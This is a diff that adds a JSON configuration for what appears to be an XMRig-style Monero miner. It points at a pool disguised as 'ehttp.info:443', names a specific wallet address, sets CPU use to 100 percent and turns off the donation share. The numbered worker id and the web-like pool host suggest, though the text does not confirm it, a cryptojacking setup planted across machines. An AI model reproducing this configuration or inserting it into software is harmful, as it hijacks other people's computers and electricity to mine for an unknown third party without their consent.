@@ -1,0 +1,45 @@
+{
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": "ip0001",
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 10,
+    "background": false,
+    "colors": true,
+    "cpu-affinity": 1,
+    "cpu-priority": 5,
+    "donate-level": 0,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 100,
+    "pools": [
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "ehttp.info:443",
+            "user": "44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 60,
+    "retries": 2,
+    "retry-pause": 2,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
